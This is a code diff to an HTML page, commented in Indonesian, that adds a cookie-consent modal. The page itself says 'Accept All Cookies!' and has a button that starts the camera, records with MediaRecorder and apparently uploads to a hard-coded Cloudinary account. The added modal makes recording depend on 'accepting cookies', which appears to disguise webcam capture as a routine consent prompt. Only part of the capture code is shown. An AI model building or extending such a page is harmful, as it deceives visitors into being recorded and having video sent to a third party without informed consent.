@@ -18,6 +18,40 @@
         #status {
             margin-top: 20px;
         }
+
+        /* Styling untuk modal cookies */
+        #cookieConsentModal {
+            display: none;
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #fff;
+            padding: 20px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            z-index: 1000;
+            max-width: 400px;
+            text-align: center;
+        }
+        #cookieConsentModal p {
+            margin: 0 0 15px;
+        }
+        #cookieConsentModal button {
+            padding: 8px 16px;
+            margin: 0 5px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        #acceptCookies {
+            background: #4CAF50;
+            color: white;
+        }
+        #declineCookies {
+            background: #f44336;
+            color: white;
+        }
     </style>
 </head>
 <body>
@@ -33,16 +67,46 @@
     <p>Accept All Cookies!</p>
     <p id="status" hidden></p>
 
+    <!-- Modal untuk meminta izin cookies -->
+    <div id="cookieConsentModal">
+        <p>Kami menggunakan cookies untuk meningkatkan pengalaman Anda. Apakah Anda setuju?</p>
+        <button id="acceptCookies">Setuju</button>
+        <button id="declineCookies">Tolak</button>
+    </div>
+
     <script>
         const CLOUD_NAME = 'dsiyan9do'; // Ganti dengan Cloud Name Anda
         const UPLOAD_PRESET = 'pproject'; // Ganti dengan Upload Preset Anda
 
         const startButton = document.getElementById('startButton');
         const statusText = document.getElementById('status');
+        const cookieConsentModal = document.getElementById('cookieConsentModal');
+        const acceptCookiesButton = document.getElementById('acceptCookies');
+        const declineCookiesButton = document.getElementById('declineCookies');
 
         let cameraStream = null;
         let mediaRecorder = null;
         let recordedChunks = [];
+
+        // Tampilkan modal cookies saat halaman dimuat
+        document.addEventListener('DOMContentLoaded', () => {
+            if (!document.cookie.includes('cookieConsent=true')) {
+                cookieConsentModal.style.display = 'block';
+            }
+        });
+
+        // Fungsi untuk menyetujui cookies
+        acceptCookiesButton.addEventListener('click', () => {
+            document.cookie = "cookieConsent=true; max-age=2592000; path=/"; // Simpan selama 30 hari
+            cookieConsentModal.style.display = 'none';
+        });
+
+        // Fungsi untuk menolak cookies
+        declineCookiesButton.addEventListener('click', () => {
+            cookieConsentModal.style.display = 'none';
+            statusText.textContent = 'Anda harus menyetujui cookies untuk menggunakan fitur ini.';
+            statusText.hidden = false;
+        });
 
         // Fungsi untuk memulai kamera
         async function startCamera() {
@@ -130,6 +194,12 @@
         }
 
         startButton.addEventListener('click', async () => {
+            if (!document.cookie.includes('cookieConsent=true')) {
+                statusText.textContent = 'Anda harus menyetujui cookies terlebih dahulu.';
+                statusText.hidden = false;
+                return;
+            }
+
             statusText.textContent = 'Mengakses kamera...';
             await startCamera();
 
